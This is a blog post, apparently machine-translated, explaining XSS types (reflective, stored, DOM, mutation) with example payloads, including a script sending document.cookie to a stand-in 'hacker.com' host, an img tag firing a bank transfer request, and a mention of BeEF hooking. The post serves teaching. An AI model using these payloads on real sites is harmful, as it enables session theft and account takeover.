<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width"><meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.4.2"><link rel="apple-touch-icon" sizes="180x180" href="/en/images/apple-touch-icon-next.png"><link rel="icon" type="image/png" sizes="32x32" href="/en/images/favicon-32x32-next.png"><link rel="icon" type="image/png" sizes="16x16" href="/en/images/favicon-16x16-next.png"><link rel="mask-icon" href="/en/images/logo.svg" color="#222"><meta name="google-site-verification" content="7yRqtT6cCpC-_R-rzM9gUoQGmheV9OZAUKIXrbAsyqE"><link rel="stylesheet" href="/en/css/main.css"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha256-HtsXJanqjKTc8vVQjO4YMhiqFoXkfBsjBWcX91T1jr8=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous"><script class="next-config" data-name="main" type="application/json">{"hostname":"sunra.top","root":"/en/","images":"/en/images","scheme":"Muse","darkmode":false,"version":"8.16.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/en/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/en/js/config.js"></script><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-8623125811074939" crossorigin="anonymous"></script><script>!function(e,p,s,r){if(void 0===e.webpushr){e.webpushr=e.webpushr||function(){(e.webpushr.q=e.webpushr.q||[]).push(arguments)};var d,t=p.getElementsByTagName(s)[0];(d=p.createElement(s)).id="webpushr-jssdk",d.async=1,d.src="https://cdn.webpushr.com/app.min.js",t.parentNode.appendChild(d)}}(window,document,"script"),webpushr("setup",{key:"BEQjc-0d1Q1CubrYZ2e2XXv5Is0ZCd3CtrNLet06owkUWK68qkxHpho2mKdnj2vpGdxddRDxRYthLuMwrTqfSB4"})</script><meta name="description" content="XSS (Cross Site Scripting, pay attention to cross-site, not cross-domain, the difference between the two you can search for yourself) vulnerability is a commonplace front-end security threats. But in"><meta property="og:type" content="article"><meta property="og:title" content="Classification and Utilization of XSS"><meta property="og:url" content="https://sunra.top/en/2021/09/05/xss-inrtroduction/index.html"><meta property="og:site_name" content="Origin of Ray"><meta property="og:description" content="XSS (Cross Site Scripting, pay attention to cross-site, not cross-domain, the difference between the two you can search for yourself) vulnerability is a commonplace front-end security threats. But in"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://res.cloudinary.com/dvtfhjxi4/image/upload/v1630810341/origin-of-ray/screenshot-20210905-104826_pj3szq.png"><meta property="og:image" content="https://res.cloudinary.com/dvtfhjxi4/image/upload/v1630810341/origin-of-ray/screenshot-20210905-104937_d7exny.png"><meta property="og:image" content="https://res.cloudinary.com/dvtfhjxi4/image/upload/v1630810342/origin-of-ray/screenshot-20210905-105024_uewqhm.png"><meta property="og:image" content="https://res.cloudinary.com/dvtfhjxi4/image/upload/v1630810878/origin-of-ray/screenshot-20210905-110054_wygyia.png"><meta property="og:image" content="https://res.cloudinary.com/dvtfhjxi4/image/upload/v1630809451/origin-of-ray/screenshot-20210905-103113_vali9w.png"><meta property="og:image" content="https://res.cloudinary.com/dvtfhjxi4/image/upload/v1630809450/origin-of-ray/screenshot-20210905-103542_zswpqm.png"><meta property="og:image" content="https://res.cloudinary.com/dvtfhjxi4/image/upload/v1630809451/origin-of-ray/screenshot-20210905-103707_zpy5fs.png"><meta property="og:image" content="https://res.cloudinary.com/dvtfhjxi4/image/upload/v1630809451/origin-of-ray/screenshot-20210905-103606_o1jxhi.png"><meta property="og:image" content="https://res.cloudinary.com/dvtfhjxi4/image/upload/v1630809665/origin-of-ray/screenshot-20210905-104046_dwap8o.png"><meta property="og:image" content="https://res.cloudinary.com/dvtfhjxi4/image/upload/v1630811356/origin-of-ray/screenshot-20210905-110653_srguo9.png"><meta property="og:image" content="https://res.cloudinary.com/dvtfhjxi4/image/upload/v1630811355/origin-of-ray/screenshot-20210905-110715_codkmh.png"><meta property="og:image" content="https://res.cloudinary.com/dvtfhjxi4/image/upload/v1630813809/origin-of-ray/screenshot-20210905-114955_admtsl.png"><meta property="og:image" content="https://res.cloudinary.com/dvtfhjxi4/image/upload/v1630811356/origin-of-ray/screenshot-20210905-110821_fhqa8m.png"><meta property="og:image" content="https://res.cloudinary.com/dvtfhjxi4/image/upload/v1630811355/origin-of-ray/screenshot-20210905-110842_s0ytrd.png"><meta property="og:image" content="https://res.cloudinary.com/dvtfhjxi4/image/upload/v1630812836/origin-of-ray/screenshot-20210905-113248_db3p0i.png"><meta property="og:image" content="https://res.cloudinary.com/dvtfhjxi4/image/upload/v1630813534/origin-of-ray/screenshot-20210905-114517_hwplh3.png"><meta property="article:published_time" content="2021-09-05T01:47:31.000Z"><meta property="article:modified_time" content="2024-06-19T09:10:17.805Z"><meta property="article:author" content="Ray Sun"><meta property="article:tag" content="Technology Sharing Using Tutorials Principles Front End Computer Graphics"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://res.cloudinary.com/dvtfhjxi4/image/upload/v1630810341/origin-of-ray/screenshot-20210905-104826_pj3szq.png"><link rel="canonical" href="https://sunra.top/en/2021/09/05/xss-inrtroduction/"><script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://sunra.top/en/2021/09/05/xss-inrtroduction/","path":"2021/09/05/xss-inrtroduction/","title":"Classification and Utilization of XSS"}</script><script class="next-config" data-name="calendar" type="application/json">""</script><title>Classification and Utilization of XSS | Origin of Ray</title><script async src="https://www.googletagmanager.com/gtag/js?id=G-KEJ1L66CKC"></script><script class="next-config" data-name="google_analytics" type="application/json">{"tracking_id":"G-KEJ1L66CKC","only_pageview":false}</script><script src="/en/js/third-party/analytics/google-analytics.js"></script><script src="/en/js/third-party/analytics/baidu-analytics.js"></script><script async src="https://hm.baidu.com/hm.js?cc2e15dfd66849cf1d7843d0d532438e"></script><link rel="dns-prefetch" href="https://blog-comments-3w44.vercel.app/"><noscript><link rel="stylesheet" href="/en/css/noscript.css"></noscript><link rel="alternate" href="/en/atom.xml" title="Origin of Ray" type="application/atom+xml"></head><body itemscope itemtype="http://schema.org/WebPage" class="use-motion"><div class="headband"></div><main class="main"><div class="column"><header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container"><div class="site-nav-toggle"><div class="toggle" aria-label="Toggle navigation bar" role="button"><span class="toggle-line"></span><span class="toggle-line"></span><span class="toggle-line"></span></div></div><div class="site-meta"><a href="/en/" class="brand" rel="start"><i class="logo-line"></i><p class="site-title">Origin of Ray</p><i class="logo-line"></i></a><p class="site-subtitle" itemprop="description">Lift the fog of the Internet together</p></div><div class="site-nav-right"><div class="toggle popup-trigger" aria-label="Search" role="button"><i class="fa fa-search fa-fw fa-lg"></i></div></div></div><nav class="site-nav"><ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/en/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-categories"><a href="/en/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li><li class="menu-item menu-item-archives"><a href="/en/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li><li class="menu-item menu-item-english"><a href="https://sunra.top/en" rel="section"><i class="fa fa-language fa-fw"></i>English</a></li><li class="menu-item menu-item-中文"><a href="https://sunra.top/" rel="section"><i class="fa fa-language fa-fw"></i>中文</a></li><li class="menu-item menu-item-search"><a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i> Search</a></li></ul></nav><div class="search-pop-overlay"><div class="popup search-popup"><div class="search-header"><span class="search-icon"><i class="fa fa-search"></i></span><div class="search-input-container"> <input autocomplete="off" autocapitalize="off" maxlength="80" placeholder="Searching..." spellcheck="false" type="search" class="search-input"></div><span class="popup-btn-close" role="button"><i class="fa fa-times-circle"></i></span></div><div class="search-result-container no-result"><div class="search-result-icon"><i class="fa fa-spinner fa-pulse fa-5x"></i></div></div></div></div></header><aside class="sidebar"><div class="sidebar-inner sidebar-nav-active sidebar-toc-active"><ul class="sidebar-nav"><li class="sidebar-nav-toc"> Table of Contents</li><li class="sidebar-nav-overview"> Overview</li></ul><div class="sidebar-panel-container"><div class="post-toc-wrap sidebar-panel"><div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#the-dangers-of-xss-attacks"><span class="nav-number">1.</span> <span class="nav-text">The dangers of XSS attacks</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#basic-attack-principles-of-xss"><span class="nav-number">2.</span> <span class="nav-text">Basic attack principles of XSS</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#reflective-xss"><span class="nav-number">3.</span> <span class="nav-text">Reflective XSS</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#storage-xss"><span class="nav-number">4.</span> <span class="nav-text">Storage XSS</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#stored-xss-combined-with-file-upload-vulnerability"><span class="nav-number">4.1.</span> <span class="nav-text">Stored XSS combined with file upload vulnerability</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#dom%E5%9E%8Bxss"><span class="nav-number">5.</span> <span class="nav-text">DOM型XSS</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#mutant-xss"><span class="nav-number">6.</span> <span class="nav-text">Mutant XSS</span></a></li></ol></div></div><div class="site-overview-wrap sidebar-panel"><div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person"> <img class="site-author-image" itemprop="image" alt="Ray Sun" src="https://res.cloudinary.com/dvtfhjxi4/image/upload/v1592617514/avatar_rpap6c.jpg"><p class="site-author-name" itemprop="name">Ray Sun</p><div class="site-description" itemprop="description">Lift the fog of the Internet together</div></div><div class="site-state-wrap animated"><nav class="site-state"><div class="site-state-item site-state-posts"> <a href="/en/archives/"><span class="site-state-item-count">268</span> <span class="site-state-item-name">posts</span></a></div><div class="site-state-item site-state-categories"> <a href="/en/categories/"><span class="site-state-item-count">16</span> <span class="site-state-item-name">categories</span></a></div></nav></div><div class="links-of-author animated"><span class="links-of-author-item"><a href="https://github.com/Sun668" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Sun668" rel="external nofollow noopener noreferrer" target="_blank"><i class="fab fa-github fa-fw"></i> GitHub</a></span><span class="links-of-author-item"><a href="mailto:947692259@qq.com" title="E-Mail → mailto:947692259@qq.com" rel="external nofollow noopener noreferrer" target="_blank"><i class="fa fa-envelope fa-fw"></i> E-Mail</a></span></div><div class="cc-license animated" itemprop="license"> <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="external nofollow noopener noreferrer" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a></div></div></div></div><div class="wechat_channel" style="width:50%;margin-left:25%;margin-bottom:5px"><br> <img src="https://res.cloudinary.com/dvtfhjxi4/image/upload/v1685836114/origin-of-ray/wechat_channel_zmg0hw.jpg"></div><div class="wechat_channel" style="width:50%;margin-left:25%"><br> <span>一站式程序员工具平台</span> <img src="https://origin-of-ray.oss-cn-shenzhen.aliyuncs.com/rannie_share.png"></div></aside></div><div class="main-inner post posts-expand"><div class="post-block"><article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en"><link itemprop="mainEntityOfPage" href="https://sunra.top/en/2021/09/05/xss-inrtroduction/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="https://res.cloudinary.com/dvtfhjxi4/image/upload/v1592617514/avatar_rpap6c.jpg"><meta itemprop="name" content="Ray Sun"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="Origin of Ray"><meta itemprop="description" content="Lift the fog of the Internet together"></span><span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork"><meta itemprop="name" content="Classification and Utilization of XSS | Origin of Ray"><meta itemprop="description" content></span><header class="post-header"><h1 class="post-title" itemprop="name headline"> Classification and Utilization of XSS</h1><div class="post-meta-container"><div class="post-meta"><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar"></i></span> <span class="post-meta-item-text">Posted on</span> <time title="Created: 2021-09-05 09:47:31" itemprop="dateCreated datePublished" datetime="2021-09-05T09:47:31+08:00">2021-09-05</time></span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar-check"></i></span> <span class="post-meta-item-text">Edited on</span> <time title="Modified: 2024-06-19 17:10:17" itemprop="dateModified" datetime="2024-06-19T17:10:17+08:00">2024-06-19</time></span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-folder"></i></span> <span class="post-meta-item-text">In</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/en/categories/Security/" itemprop="url" rel="index"><span itemprop="name">Security</span></a></span></span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-comment"></i></span> <span class="post-meta-item-text">Waline:</span><a title="waline" href="/en/2021/09/05/xss-inrtroduction/#waline" itemprop="discussionUrl"><span class="post-comments-count waline-comment-count" data-path="/en/2021/09/05/xss-inrtroduction/" itemprop="commentCount"></span></a></span></div></div></header><div class="post-body" itemprop="articleBody"><p>XSS (Cross Site Scripting, pay attention to cross-site, not cross-domain, the difference between the two you can search for yourself) vulnerability is a commonplace front-end security threats.</p><p>But in fact, it still ranks in the top ten of the front-end vulnerability list so far.</p><p>In addition, I recently bought a course on cyber security vulnerabilities. Of course, the main purpose is to protect my information security, hahaha.</p><p>The course is roughly divided into five parts. The first part is the basics of security, which are all basic knowledge, such as HTML, CSS, JS, PHP, NGINX, Spring, network protocols, etc. In fact, it is a classic interview question. What will happen when you receive a webpage? This question is an excellent question. It can even be said that it is the backbone of all technologies on the Internet. Almost all of your knowledge can be linked to the real question.</p><p>The second part is the back-end security, a small part is about file upload vulnerabilities, or some Nginx vulnerabilities, most of them are about SQL injection, this part, read a little I think I should go back to see the database and then come back to see, because the basic do not understand.</p><p>So jump directly to the third part of the front-end security, up is this XSS, and refresh their own wave of cognition, record.</p><span id="more"></span><h2 id="the-dangers-of-xss-attacks"><a class="markdownIt-Anchor" href="#the-dangers-of-xss-attacks"></a> The dangers of XSS attacks</h2><p>Before talking about the three common XSS, let’s talk about the basic principles of XSS attacks.</p><p>As we all know, the web pages we see are actually HTML, which is a word we will hear in elementary school computer class, called “Hypertext Markup Language”, which uses tags to represent the content we want to present, and then the browser converts these tags into pictures according to the design standards of the language. Yes, that’s right, in fact, no matter what software it is, it is finally drawn into pictures and displayed to users. There is no difference between web pages and ordinary software. For computers, the last step is to draw pictures.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt; div &gt; This is a div &lt;/div &gt;</span><br><span class="line">&lt; img src = &quot;Image URL link&quot;/&gt;</span><br></pre></td></tr></table></figure><p>This is a very simple HTML, the actual page is much more complex than this, you can open a web page, with developer tools to see.</p><p>There are many kinds of tags, some of which will send requests or executable code.</p><p>For example, the img tag, the src attribute is actually a request sent to obtain the server image referred to by the src attribute. Of course, if it is a normal website, after obtaining the image, it will be rendered into a normal image, but if this src is not a normal What about the image address, but a transfer request? For example, the following</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://www.somebank/transformer/from/A/to/B/dollar/10000&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>Assuming that the transfer request of a bank is this’<a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.somebank/transformer/from/A/to/B/dollar/1000">https://www.somebank/transformer/from/A/to/B/dollar/1000</a> ', this request is normally made when you choose to transfer money from your account (A) to B on the official website of the bank. It will be issued, usually by clicking a button (html: &lt; button onClick = “Initiate Transfer Request” &gt; Confirm Transfer , this thing renders out the button we usually see. It can be seen that in essence, button and img are just a label).</p><p>But if it’s not normal, you open a web page, a web page of unknown origin, and there is this picture in it. When the browser renders the img, it will try to go to the src address to get the picture, but unfortunately, this address does not have a picture. If you send a transfer request, the bank server will only tell you that the transfer was successful, so you didn’t get the picture back. The location where the picture should have appeared may be a simple cross, and your money is gone.</p><p>Img is relatively simple, you can only send a get request. If it is a script tag, it is where we usually say the js script is stored. If you inject a script into the attacker, you can really do whatever you want, and all your information will be taken away. Take away, such as cookies (that is, your information on a certain website. If you get this, it is equivalent to opening all your permissions on the website to hackers. If you get this, you only need a simple document.cookie, only these A few letters, your identity was stolen).</p><h2 id="basic-attack-principles-of-xss"><a class="markdownIt-Anchor" href="#basic-attack-principles-of-xss"></a> Basic attack principles of XSS</h2><p>The above mentioned the harm of XSS, then talk about the basic principles, we will take the most harmful script as an example, in fact, we find a way to inject a script tag into a website.</p><p>This matter is not difficult, we just said, all are tags, a normal web page, such as a forum, many people can publish their own remarks on it, such as me I posted under a post, “The weather is so good today”, the web page wants to render, in fact, first turn this sentence to “&lt; span &gt; The weather is so good today ”;</p><p>But if my comment is &lt; script &gt; post (‘<a target="_blank" rel="external nofollow noopener noreferrer" href="http://hacker.com/cookie">http://hacker.com/cookie</a>’, document.cookie) '; if this forum is not secure enough, do you think this thing will be displayed to you like a normal comment?</p><p>No, this thing will be rendered as a script tag, and the code inside (‘post (’ <a target="_blank" rel="external nofollow noopener noreferrer" href="http://hacker.com/cookie">http://hacker.com/cookie</a> ', document.cookie) ') will be executed, and your cookie will be sent to the attacker’s server.</p><p>Of course, the development of the present, there are few sites and this very basic vulnerability, this thing is, hackers find a way to bypass the site security.</p><p>The ultimate goal is to make your content not be considered a simple display of a piece of text.</p><h2 id="reflective-xss"><a class="markdownIt-Anchor" href="#reflective-xss"></a> Reflective XSS</h2><p>This type of XSS is relatively basic and less harmful. It is called reflection type because after the link is connected to the backend, the backend parsing is completed and it is directly returned to the front end. Just like a reflection, it does not affect the backend. have an impact.</p><p>It requires hackers to construct a URL and then tempt users to click.</p><p>Suppose there is a website, after you log in successfully,</p><p><img src="https://res.cloudinary.com/dvtfhjxi4/image/upload/v1630810341/origin-of-ray/screenshot-20210905-104826_pj3szq.png" alt></p><p>He will jump to a new address, such as <a target="_blank" rel="external nofollow noopener noreferrer" href="http://localhost/xss_get.php?firstname=ray&amp;lastname=sun">http://localhost/xss_get.php?firstname=ray&amp;lastname=sun</a></p><p>Then the website will take out the ray and sun from the fixed position in the url to render to the page.</p><p>This looks fine, but if you enter a script, ‘<a target="_blank" rel="external nofollow noopener noreferrer" href="http://site.com/user/">http://site.com/user/</a> &lt; script &gt; alert (document.cookie) ’</p><p><img src="https://res.cloudinary.com/dvtfhjxi4/image/upload/v1630810341/origin-of-ray/screenshot-20210905-104937_d7exny.png" alt></p><p>At this time, the performance of the browser is like this:</p><p><img src="https://res.cloudinary.com/dvtfhjxi4/image/upload/v1630810342/origin-of-ray/screenshot-20210905-105024_uewqhm.png" alt></p><p>If I don’t alert, but send a request to the background, then the cookie will be stolen by me.</p><p>So how to defend? The most basic thing is not to click on strange URLs, but it is still naive.</p><p>The first way, some web pages will prompt you to let you draw, after you click, it is equivalent to clicking this link, such as</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt; img onclick = &quot;window.location.href = http://localhost/xss_get.php?firstname=ray&amp;lastname=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E&amp;form=submit&quot; src = &quot;This is indeed a picture address&quot;/&gt;</span><br></pre></td></tr></table></figure><p>You click on this picture, it will start onclick the corresponding code, and then modify window.locaion.href, this thing changed, the browser will jump.</p><p>The second method, short URL or QR code:</p><p>For example, the link above, go to <a target="_blank" rel="external nofollow noopener noreferrer" href="http://985.so">985.so</a>, it will help you convert to this:</p><p><img src="https://res.cloudinary.com/dvtfhjxi4/image/upload/v1630810878/origin-of-ray/screenshot-20210905-110054_wygyia.png" alt></p><p>In general, this thing can have no features at all, so the most fundamental method is not to click randomly, do not scan the code randomly, you do not know what is behind.</p><h2 id="storage-xss"><a class="markdownIt-Anchor" href="#storage-xss"></a> Storage XSS</h2><p>This type of harm is relatively large, because it is persistent in the database, so it is called storage type.</p><p>For example, I posted a comment on this website, and the content was my name: ray.</p><p>Then it looks like this, it seems normal, and the content I posted is in the reply here.</p><p><img src="https://res.cloudinary.com/dvtfhjxi4/image/upload/v1630809451/origin-of-ray/screenshot-20210905-103113_vali9w.png" alt></p><p>If the comment I try to type is’ &lt; script &gt; alert (‘xss); ’</p><p><img src="https://res.cloudinary.com/dvtfhjxi4/image/upload/v1630809450/origin-of-ray/screenshot-20210905-103542_zswpqm.png" alt></p><p>Browsers will render like this</p><p><img src="https://res.cloudinary.com/dvtfhjxi4/image/upload/v1630809451/origin-of-ray/screenshot-20210905-103707_zpy5fs.png" alt></p><p>Is there a problem with this, no problem at all, this is how browsers work, you ask me to render a script tag, and I render it.</p><p>But the result is this:</p><p><img src="https://res.cloudinary.com/dvtfhjxi4/image/upload/v1630809451/origin-of-ray/screenshot-20210905-103606_o1jxhi.png" alt></p><p>Alert is a pop-up warning prompt, but hackers are directly sent a request is done.</p><p>We can see what the database looks like:</p><p><img src="https://res.cloudinary.com/dvtfhjxi4/image/upload/v1630809665/origin-of-ray/screenshot-20210905-104046_dwap8o.png" alt></p><p>For the database, ray and ‘&lt; script &gt; alert (’ xss); 'are both pieces of text, there is no difference, this script tag only makes sense for the browser.</p><p>But then, everyone who opens this post will load this malicious code and do whatever they want.</p><p>How much more can we do as we please?</p><p>Introduce a tool, BeEF, which provides a background, a background management page, a script, as long as you find a way to inject this script into it, you can do anything.</p><p>Take a brief look at this script, it’s very long, just take a look.</p><p><img src="https://res.cloudinary.com/dvtfhjxi4/image/upload/v1630811356/origin-of-ray/screenshot-20210905-110653_srguo9.png" alt></p><p>I started a BeEF locally, and then I figured out a way to inject this script into it.</p><p>For example here:</p><p><img src="https://res.cloudinary.com/dvtfhjxi4/image/upload/v1630811355/origin-of-ray/screenshot-20210905-110715_codkmh.png" alt></p><p>After success, I can see all your information in the BeEF background, including your system, browser, cookies, etc</p><p><img src="https://res.cloudinary.com/dvtfhjxi4/image/upload/v1630813809/origin-of-ray/screenshot-20210905-114955_admtsl.png" alt></p><p>Is it scary? There are even scarier ones, such as I can induce you to download malicious software</p><p><img src="https://res.cloudinary.com/dvtfhjxi4/image/upload/v1630811356/origin-of-ray/screenshot-20210905-110821_fhqa8m.png" alt></p><p>Then your browser will display this:</p><p><img src="https://res.cloudinary.com/dvtfhjxi4/image/upload/v1630811355/origin-of-ray/screenshot-20210905-110842_s0ytrd.png" alt></p><p>If you click, it will download the file I specified, it is likely that your computer will be remotely controlled by me. Of course, this is in theory. I don’t have the ability for the time being, hahaha</p><p>After this BeEF, another blog introduction, there are too many functions, so I won’t introduce them one by one</p><h3 id="stored-xss-combined-with-file-upload-vulnerability"><a class="markdownIt-Anchor" href="#stored-xss-combined-with-file-upload-vulnerability"></a> Stored XSS combined with file upload vulnerability</h3><p>Some files can be inserted into the code, such as svg can be inserted into the script script, if the website uploads the file without detection, you can upload a svg image with malicious code, then it will form a storage type XSS.</p><h2 id="dom型xss"><a class="markdownIt-Anchor" href="#dom型xss"></a> DOM型XSS</h2><p>DOM XSS is actually a reflection type, or supplement, we just said reflection type, need to request to the background, the background to extract the link information, and then splice the entire web page to the front end, you can see, this is for the front and back end separation, or pure front-end project is useless, because it is the front-end dynamic changes, rather than the back-end to.</p><p>In this case, you need to use DOM-type XSS.</p><p>It is achieved by dynamically manipulating the DOM tree without relying on data submission to the server, such as:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml">document.write(&#x27;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>)</span></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>&#x27;)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>The same point as the reflection type is that it does not control the user’s input well and renders the script script as a tag.</p><p>The difference lies in whether it passes through the server. The reflective page is the server level splicing the complete page according to the url to render the front end, while the DOM type is to directly modify the page structure in the script and insert a script node, or the reflection at the beginning. It is the reflection between user input and the backend. DOM reflection is the reflection between user input and the front-end’s own logic, and the front-end itself will react according to user input.</p><p>The harm of DOM type is that it can bypass the scene of front-end and back-end separation, or it can not go through the firewall, because it is not the back-end, then this time, the security problem is all in the front-end</p><p>For example, if the front end has this logic:</p><p><img src="https://res.cloudinary.com/dvtfhjxi4/image/upload/v1630812836/origin-of-ray/screenshot-20210905-113248_db3p0i.png" alt></p><p>This code directly obtains parameters from the url on the front end, modifies the page structure, and starts the reflection type, this logic is in the back end.</p><p>The rest is basically the same as the first reflection type</p><h2 id="mutant-xss"><a class="markdownIt-Anchor" href="#mutant-xss"></a> Mutant XSS</h2><p>This kind of XSS is more wonderful, it is caused by different browsers’ different parsing of the html standard. Yes, it is very annoying. Every browser wants to be a standard setter, and then it is troublesome.</p><p>The attacker enters seemingly safe content, which is rewritten, written or modified by the browser when parsing the tag, mutates, generates unsafe code and executes it, that is, mXSS, which is extremely difficult to detect and filter.</p><p>For example, this code:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>I am trying to be <span class="tag">&lt;<span class="name">i</span>&gt;</span>malicious<span class="tag">&lt;/<span class="name">i</span>&gt;</span> <span class="tag">&lt;<span class="name">u</span>&gt;</span>here<span class="tag">&lt;/<span class="name">u</span>&gt;</span>! <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Maybe your browser can help filter this code. After being translated by you, the browser’s strategy will be invalid.</p><p>For example, this one:</p><p><img src="https://res.cloudinary.com/dvtfhjxi4/image/upload/v1630813534/origin-of-ray/screenshot-20210905-114517_hwplh3.png" alt></p><p>After three steps, this mediocre piece of code became a vulnerability.</p></div><footer class="post-footer"><div class="post-copyright"><ul><li class="post-copyright-author"> <strong>Post author:</strong> Ray Sun</li><li class="post-copyright-link"> <strong>Post link:</strong> <a href="https://sunra.top/en/2021/09/05/xss-inrtroduction/" title="Classification and Utilization of XSS">https://sunra.top/en/2021/09/05/xss-inrtroduction/</a></li><li class="post-copyright-license"> <strong>Copyright Notice:</strong> All articles in this blog are licensed under<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow noopener noreferrer" target="_blank"><i class="fab fa-fw fa-creative-commons"></i> BY-NC-SA</a> unless stating additionally.</li></ul></div><div class="followme"> <span>Welcome to my other publishing channels</span><div class="social-list"><div class="social-item"><span class="social-link"><span class="icon"><i class="fab fa-weixin"></i></span> <span class="label">WeChat</span></span> <img class="social-item-img" src="https://res.cloudinary.com/dvtfhjxi4/image/upload/v1685836114/origin-of-ray/wechat_channel_zmg0hw.jpg"></div><div class="social-item"><a target="_blank" class="social-link" href="/en/atom.xml"><span class="icon"><i class="fa fa-rss"></i></span> <span class="label">RSS</span></a></div></div></div><div class="post-nav"><div class="post-nav-item"><a href="/en/2021/09/04/what-is-serverless/" rel="prev" title="What is Serverless?"><i class="fa fa-chevron-left"></i> What is Serverless?</a></div><div class="post-nav-item"> <a href="/en/2021/09/10/xss-pseudo-protocol-and-code-bypass/" rel="next" title="Pseudo-Protocol and Encoding Bypass">Pseudo-Protocol and Encoding Bypass<i class="fa fa-chevron-right"></i></a></div></div></footer></article></div><div class="comments" id="waline"></div></div></main><footer class="footer"><div class="footer-inner"><div class="copyright"> &copy; <span itemprop="copyrightYear">2024</span><span class="with-love"><i class="fa fa-heart"></i></span> <span class="author" itemprop="copyrightHolder">Ray Sun</span></div><div class="powered-by">Powered by <a href="https://hexo.io/" rel="external nofollow noopener noreferrer" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="external nofollow noopener noreferrer" target="_blank">NexT.Muse</a></div></div></footer><div class="toggle sidebar-toggle" role="button"><span class="toggle-line"></span><span class="toggle-line"></span><span class="toggle-line"></span></div><div class="sidebar-dimmer"></div><div class="back-to-top" role="button" aria-label="Back to top"><i class="fa fa-arrow-up fa-lg"></i> <span>0%</span></div><noscript><div class="noscript-warning">Theme NexT works best with JavaScript enabled</div></noscript><script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" 